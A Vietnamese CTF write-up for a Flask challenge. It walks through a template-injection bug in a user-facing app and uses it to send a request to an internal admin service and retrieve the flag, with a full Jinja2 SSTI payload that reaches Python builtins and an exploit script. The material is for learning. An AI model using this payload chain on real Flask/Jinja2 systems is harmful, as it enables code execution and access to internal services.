# easy server side

<figure><img src="../../.gitbook/assets/image (201).png" alt=""><figcaption></figcaption></figure>

### Challenge Overview <a href="#user-content-challenge-overview" id="user-content-challenge-overview"></a>

Challenge này gồm 2 Flask application:

* **User App** (port 5000): Cho phép user nhập input và render template
* **Admin App** (port 5001): Internal service chứa flag, chỉ trả về flag khi đăng nhập đúng credentials

**Mục tiêu**: Khai thác SSTI trên User App để gọi SSRF đến Admin App và lấy flag.

***

### ANALYZE <a href="#user-content-source-code-analysis" id="user-content-source-code-analysis"></a>

#### User App (usr/app.py) <a href="#user-content-user-app-usrapppy" id="user-content-user-app-usrapppy"></a>

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        user_input = request.form.get('input', '')
        template = f'''
        <h1>Output:</h1>
        {{ {{% raw %}} {{ {user_input} }} {{% endraw %}} }}
        <form method="POST">
            Input: <input type="text" name="input" value="{user_input}">
            <input type="submit" value="Render">
        </form>
        '''
        return render_template_string(template, config=app.config)
    return '''
    <form method="POST">
        Input: <input type="text" name="input">
        <input type="submit" value="Render">
    </form>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
```

**Phân tích lỗ hổng:**

1. **Dòng 11**: Sử dụng `{% raw %}...{% endraw %}` để escape nội dung Jinja2 bên trong. Tuy nhiên, đây là f-string nên `{user_input}` được thay thế trước khi Jinja2 xử lý.
2.  **Dòng 13 (Lỗ hổng chính)**:

    ```
    value="{user_input}"
    ```

    User input được đưa trực tiếp vào HTML attribute mà không có bất kỳ sanitization nào. Khi `render_template_string()` được gọi, Jinja2 sẽ xử lý toàn bộ template, bao gồm cả phần inject của attacker.

**Kỹ thuật khai thác:**

* Đóng attribute `value` bằng `"`
* Đóng tag `<input>` bằng `>`
* Inject Jinja2 template syntax `{{...}}`
* Mở lại tag để cân bằng HTML

***

#### Admin App (admin/admin.py) <a href="#user-content-admin-app-adminadminpy" id="user-content-admin-app-adminadminpy"></a>

```python
from flask import Flask, request

app = Flask('internal')

FLAG = "DH{Fake_Flag}"

@app.route('/auth', methods=['POST'])
def auth():
    data = request.get_json() or request.form.to_dict()
    if data.get('user') == 'admin' and data.get('pass') == 'admin':
        return {'success': True, 'flag': FLAG}
    return {'error': 'Invalid'}

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5001, debug=False)
```

**Phân tích:**

* Endpoint `/auth` chấp nhận cả JSON (`request.get_json()`) và form data (`request.form.to_dict()`)
* Credentials: `user=admin`, `pass=admin`
* Chỉ có thể truy cập từ localhost (`127.0.0.1:5001`)

***

### EXPLOIT <a href="#user-content-exploitation" id="user-content-exploitation"></a>

#### Step 1: Xác nhận SSTI <a href="#user-content-step-1-xac-nhan-ssti" id="user-content-step-1-xac-nhan-ssti"></a>

Payload:

```
"><h1>{{7*7}}</h1><input value="
```

Template sau khi inject:

```
<input type="text" name="input" value=""><h1>{{7*7}}</h1><input value="">
```

Jinja2 sẽ evaluate `{{7*7}}` thành `49`.

<figure><img src="../../.gitbook/assets/image (203).png" alt=""><figcaption></figcaption></figure>

***

#### Step 2: SSRF đến Admin Service <a href="#user-content-step-2-ssrf-den-admin-service" id="user-content-step-2-ssrf-den-admin-service"></a>

Payload hoàn chỉnh:

```python
">{{self.__init__.__globals__.__builtins__.__import__('requests').post('http://127.0.0.1:5001/auth',json={'user':'admin','pass':'admin'}).text}}<input value="
```

**Giải thích payload:**

| Phần                                              | Mục đích                           |
| ------------------------------------------------- | ---------------------------------- |
| `">`                                              | Đóng `value=""` và tag `<input>`   |
| `{{...}}`                                         | Jinja2 expression được evaluate    |
| `self.__init__.__globals__.__builtins__`          | Truy cập Python builtins           |
| `.__import__('requests')`                         | Import module `requests`           |
| `.post('http://127.0.0.1:5001/auth', json={...})` | Gửi POST request đến admin service |
| `.text`                                           | Lấy response body                  |
| `<input value="`                                  | Mở tag mới để cân bằng HTML        |

***

### Script <a href="#user-content-exploit-script" id="user-content-exploit-script"></a>

```python
#!/usr/bin/env python3
import requests
import re
URL = "http://target:5000/"
ssrf_payload = '''">{{self.__init__.__globals__.__builtins__.__import__('requests').post('http://127.0.0.1:5001/auth',json={'user':'admin','pass':'admin'}).text}}<input value="'''
r = requests.post(URL, data={"input": ssrf_payload})
flag = re.search(r'DH\{[^}]+\}', r.text)
if flag:
    print(f"FLAG: {flag.group()}")
```

***

### Flag <a href="#user-content-flag" id="user-content-flag"></a>

```
DH{1f3fa07521dafa1798ed4f66baf7187118a898df0b367e2784967f076eadf3a2}
```
